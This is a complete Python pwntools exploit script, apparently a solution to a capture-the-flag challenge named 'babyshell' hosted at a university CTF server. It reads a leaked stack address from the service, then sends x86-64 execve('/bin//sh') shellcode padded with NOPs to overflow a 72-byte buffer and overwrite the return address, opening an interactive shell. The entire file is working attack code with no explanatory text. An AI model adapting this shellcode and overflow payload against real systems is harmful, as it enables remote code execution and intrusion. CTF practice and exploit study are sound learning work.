#!/usr/bin/python3
from pwn import *

ip = 'ctf.uniwa.gr' # change this
port = 31193 # change this
fname = './babyshell' # change this

LOCAL = False

if LOCAL:
	r = process(fname)

else:
	r = remote(ip, port)

ru = lambda x : r.recvuntil(x)
inter = lambda : r.interactive()
sla = lambda x,y : r.sendlineafter(x,y)

def pwn():
	sla('>', '2')
	sla('>', 'random')
	sc = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

	ru('[')
	leaked = int(ru(']')[:-1],16)
	print('Leaked: 0x{:x}'.format(leaked)) 
	payload = sc.ljust(72, b'\x90') + p64(leaked)
	sla('>', payload)
	inter()


if __name__ == '__main__':
	pwn()
